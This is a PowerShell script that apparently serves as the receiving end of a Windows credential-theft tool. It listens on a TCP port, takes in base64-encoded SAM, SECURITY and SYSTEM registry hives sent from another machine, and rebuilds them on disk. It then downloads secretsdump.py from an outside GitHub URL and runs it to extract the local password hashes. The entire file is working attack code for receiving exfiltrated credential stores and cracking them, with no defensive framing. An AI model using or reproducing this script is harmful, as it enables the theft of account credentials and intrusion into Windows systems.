function Invoke-Reciever {
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [int]
        $port = 9000
    )
    Write-Host
    Write-Host
    Write-Host Starting Server...

    $endpoint = new-object System.Net.IPEndPoint ([system.net.ipaddress]::any, $port)
    $listener = new-object System.Net.Sockets.TcpListener $endpoint
    $listener.start()
    $databuilder = New-Object byte[] 1024
    $count1 = New-Object byte[] 1024
    $count2 = New-Object byte[] 1024
    $count3 = New-Object byte[] 1024
    $mod1 = New-Object byte[] 1024
    $mod2 = New-Object byte[] 1024
    $mod3 = New-Object byte[] 1024

    Write-Host Waiting For Connection...

    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()

    Write-Host Connected
    Write-Host
    Write-Host Recieveing Data...

    $stream.read($count1, 0, $count1.Length)
    $stream.Write('0',0,1)
    $stream.read($count2, 0, $count2.Length)
    $stream.Write('0',0,1)
    $stream.read($count3, 0, $count3.Length)
    0..([int]($count1.Length)-1) | ForEach-Object {if ($count1[$_] -ne 0){$pack1+=[text.encoding]::ASCII.GetString($count1[$_])}}
    0..([int]($count2.Length)-1) | ForEach-Object {if ($count2[$_] -ne 0){$pack2+=[text.encoding]::ASCII.GetString($count2[$_])}}
    0..([int]($count3.Length)-1) | ForEach-Object {if ($count3[$_] -ne 0){$pack3+=[text.encoding]::ASCII.GetString($count3[$_])}}
    $stream.Write('0',0,1)
    $stream.read($mod1, 0, $mod1.Length)
    $stream.Write('0',0,1)
    $stream.read($mod2, 0, $mod2.Length)
    $stream.Write('0',0,1)
    $stream.read($mod3, 0, $mod3.Length)
    0..([int]($mod1.Length)-1) | ForEach-Object {if ($mod1[$_] -ne 0){$offset1+=[text.encoding]::ASCII.GetString($mod1[$_])}}
    0..([int]($mod2.Length)-1) | ForEach-Object {if ($mod2[$_] -ne 0){$offset2+=[text.encoding]::ASCII.GetString($mod2[$_])}}
    0..([int]($mod3.Length)-1) | ForEach-Object {if ($mod3[$_] -ne 0){$offset3+=[text.encoding]::ASCII.GetString($mod3[$_])}}
    $stream.Write('0',0,1)
    0..($pack1-1) | ForEach-Object {$stream.read($databuilder, 0, $databuilder.Length);$byte1+=$databuilder;$stream.Write('0',0,1)}
    0..($pack2-1) | ForEach-Object {$stream.read($databuilder, 0, $databuilder.Length);$byte2+=$databuilder;$stream.Write('0',0,1)}
    0..($pack3-1) | ForEach-Object {$stream.read($databuilder, 0, $databuilder.Length);$byte3+=$databuilder;$stream.Write('0',0,1)}

    Write-Host Recieved all Data
    Write-Host
    Write-Host Stopping Server
    Write-Host

    $listener.Stop()
    $listener.Server.Dispose()

    Write-Host Initialising Data Processing...
    Write-Host

    $premsg1 = New-Object byte[] ($byte1.Length-$offset1)
    $premsg2 = New-Object byte[] ($byte2.Length-$offset2)
    $premsg3 = New-Object byte[] ($byte3.Length-$offset3)
    [System.Array]::Copy($byte1, $premsg1, $premsg1.Length)
    [System.Array]::Copy($byte2, $premsg2, $premsg2.Length)
    [System.Array]::Copy($byte3, $premsg3, $premsg3.Length)

    Write-Host Starting Data Processing...
    Write-Host Processing SAM

    $msg1 = [text.encoding]::ASCII.GetString($premsg1)
    [IO.File]::WriteAllBytes((Join-Path (resolve-path './') '/SAM'), [Convert]::FromBase64String($msg1))

    Write-Host Processed SAM
    Write-Host Processing SECURITY

    $msg2 = [text.encoding]::ASCII.GetString($premsg2)
    [IO.File]::WriteAllBytes((Join-Path (resolve-path './') '/SECURITY'), [Convert]::FromBase64String($msg2))

    Write-Host Processed SECURITY
    Write-Host Processing SYSTEM

    $msg3 = [text.encoding]::ASCII.GetString($premsg3)
    [IO.File]::WriteAllBytes((Join-Path (resolve-path './') '/SYSTEM'), [Convert]::FromBase64String($msg3))

    Write-Host Processed SYSTEM
    Write-Host
    Write-Host Finished Processing
    Write-Host
    Write-Host Dumping Hashes With secretsdump.py
    Write-Host
    Write-Host

    wget "http://raw.github.com/mo-tec/HashExtractor/master/secretsdump.py" -UseBasicParsing -out (Join-Path (resolve-path './') '/secretsdump.py')
    .\secretsdump.py -system SYSTEM -security SECURITY -sam SAM LOCAL
    del ./secretsdump.py
}
Invoke-Reciever